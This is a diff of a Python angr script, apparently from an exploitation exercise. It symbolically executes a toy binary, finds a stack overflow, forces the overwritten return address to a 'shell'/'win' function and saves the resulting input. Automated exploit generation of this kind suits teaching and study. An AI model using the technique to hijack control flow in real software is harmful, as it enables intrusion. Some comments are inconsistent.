@@ -2,9 +2,9 @@ import angr
 import claripy
 
 # load the binary
-project = angr.Project("overflow3-simplified_1", load_options={ 'auto_load_libs': False })
+project = angr.Project("overflow3-simplified_2", load_options={ 'auto_load_libs': False })
 
-# This time, we will need access to symbols (to figure out where the "win" function is, for example).
+# This time, we will need access to symbols (to figure out where the "shell" function is, for example).
 # Let's generate a CFG to fill in the knowledgebase.
 cfg = project.analyses.CFG()
 
@@ -20,7 +20,7 @@ def state_vuln_filter(state):
     print("Checking saved EIP: ", saved_eip)
 
     # first, check if the return address points to a hook. If this is intact, then we assume there is no overflow
-    if project.is_hooked((saved_eip)):
+    if project.is_hooked(saved_eip):
         return False
 
     # next, create constraints representing an unsafe condition. In this case,
@@ -46,23 +46,25 @@ simgr.stashes['vuln'] = [ ]
 # Since we have the address of main in the knowledgebase, let's make a less janky initialization procedure.
 print("Initializing initial state...")
 
-# print(simgr.active[0].addr)
-# print(project.kb.functions['sub_100003ed0'].addr)
-# print("start print values")
-# for keys, value in project.kb.functions.items():
-#    print(keys)
-#    print(value)
-#    print("\n\n")
+print(simgr.active[0].addr)
+# print(project.kb.functions['sub_100003f10'].addr)
+print("start print values")
+for keys, value in project.kb.functions.items():
+   print(keys)
+   print(value)
+   print("\n\n")
 
-# print(project.kb.functions['_start'].addr)
+print(project.kb.functions['_start'].addr)
+print(simgr.active[0].addr)
+print(project.kb.functions['sub_100003f10'].addr)
 # print(simgr.active[0].addr)
-# print(project.kb.functions['sub_100003ed0'].addr)
-# # print(simgr.active[0].addr)
-# print("\nloop\n")
+print("\nloop\n")
 
 # FINDS VULNABILITY
-# while simgr.active[0].addr != project.kb.functions['sub_100003ed0'].addr:
+# while simgr.active[0].addr != project.kb.functions['sub_100003ef0'].addr:
 #     simgr.step()
+
+# print("out of loop")
 
 while simgr.active[0].addr != project.kb.functions['_start'].addr:
     simgr.step()
@@ -76,8 +78,7 @@ while not simgr.vuln:
     # step the simgr
     simgr.step()
     # after each step, move all states matching our vuln filter from the active stash to the vuln stash
-    #vuln: 100003ed0
-    # simgr.move(from_stash='active', to_stash='vuln', filter_func=lambda s: s.addr == project.kb.functions['sub_100003ed0'].addr)
+    # simgr.move(from_stash='active', to_stash='vuln', filter_func=lambda s: s.addr == project.kb.functions['sub_100003f10'].addr)
     simgr.move('active', 'vuln', filter_func=state_vuln_filter)
 
 # Now the fun part starts! Let's add a constraint that sets the overflowed return address to the "win" function.
@@ -86,19 +87,26 @@ print("Constraining saved return address!")
 vuln_state = simgr.vuln[0]
 overwritten_eip = vuln_state.memory.load(vuln_state.regs.ebp + 4, 4, endness="Iend_LE")
 print("Overwritten EIP: ", overwritten_eip)
-# Now, let's add a constraint to redirect that return address to the win function
-addr_of_win = project.kb.functions['sub_100003eb0'].addr
+# Now, let's add a constraint to redirect that return address to the shell function
+addr_of_win = project.kb.functions['sub_100003ef0'].addr
 vuln_state.add_constraints(overwritten_eip == addr_of_win)
 
-# and now let's explore the vuln stash until we reach the win function
-print("Exploring to 'sub_100003ed0' function. This is the 'vuln' function")
+# and now let's explore the vuln stash until we reach the shell
+print("Exploring to 'win' function. This is the 'win' function")
 simgr.explore(stash='vuln', find=addr_of_win)
 
+if simgr.found:
+    solution = simgr.found[0]
+    print('solution found! ')
+    pwning_input = simgr.found[0].solver.eval(arg, cast_to=bytes)
+    print("pwning_input")
+    print(pwning_input)
+    open("pwning_input", "w").write(str(pwning_input)) # since it's a string arg, we only care up to the first null byte
+    #open("pwning_input", "w").write(pwning_input.split('\0')[0]) # since it's a string arg, we only care up to the first null byte
+    print("You can crash the program by doing:")
+    print('# ./overflow3-simplified_2 "$(cat pwning_input)"')
+
+else:
+    print('no solution') #der printes det her, så det virker som om, at der ikke findes noget.
+
 # now synthesize our pwning input!
-pwning_input = simgr.found[0].solver.eval(arg, cast_to=bytes)
-print("pwning_input")
-print(pwning_input)
-open("pwning_input", "w").write(str(pwning_input)) # since it's a string arg, we only care up to the first null byte
-#open("pwning_input", "w").write(pwning_input.split('\0')[0]) # since it's a string arg, we only care up to the first null byte
-print("You can crash the program by doing:")
-print('# ./overflow3-simplified_1 "$(cat pwning_input)"')
